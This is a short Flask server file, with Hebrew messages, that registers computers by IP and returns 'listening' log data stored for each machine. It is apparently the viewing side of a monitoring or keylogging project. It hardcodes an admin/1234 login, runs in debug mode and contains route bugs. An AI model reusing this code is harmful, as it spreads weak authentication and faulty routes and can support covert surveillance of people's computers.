from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import json
from datetime import datetime

app = Flask(__name__)
CORS(app)



users = {"admin": "1234"}
computers = []

LISTEN_DIR = "listening_files"

if not os.path.exists(LISTEN_DIR):
    os.makedirs(LISTEN_DIR)


@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')

    if users.get(username) == password:
        return jsonify({"success": True, "username": username})
    return jsonify({"success": False, "message": "שם משתמש או סיסמה שגויים"}), 401


@app.route('/api/computers', methods=['GET'])
def get_computers():
    return jsonify(computers)


@app.route('/api/computers', methods=['POST'])
def add_computer():
    data = request.json
    name = data.get('name')
    ip = data.get("ip")

    if not name or not ip:
        return jsonify({"success": False,"masage":"נא למלא את כל השדות"}),400

    new_computer = {
        "name": data.get('name'),
        "ip": data.get('ip'),
        "status": "offline",
        "lastActivity": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "last_modified": ""
    }

    computers.append(new_computer)
    return jsonify(new_computer)



@app.route('/api/computers/<computer_ip>', methods=['DELETE'])
def remove_computer(computer_ip):
    global computers
    computers = [computer for computer in computers if computer['ip'] != computer_ip]
    return jsonify({"success": True})


@app.route('/api/computers/<int:computer_id>', methods=['GET'])
def get_computer(computer_ip):
    computer = next((computer for computer in computers if computer['ip'] == computer_ip), None)
    if computer:
        file_path = os.path.join(LISTEN_DIR,f"{computer["ip"]}.log")
        computer['data'] = os.path.exists(file_path)
        if computer['data']:
            computer["last_modified"] = datetime.fromtimestamp(
                os.path.getmtime(file_path)
            ).strftime("%Y-%m-%d %H:%M:%S")
        return jsonify(computer)
    return jsonify({"error": "מחשב לא נמצא"}), 404

@app.route('/api/listening/<computer_ip>', method=['GET'])
def get_listening_data(computer_ip):
    file_path = os.path.join(LISTEN_DIR, f"{computer_ip}.log")

    if not os.path.exists(file_path):
        return jsonify({"error":"אין נתוני האזנה זמינים"}),404
    with open(file_path,'r') as file:
        data = json.load(file)
    return jsonify(data)

if __name__ == '__main__':
    app.run(debug=True)
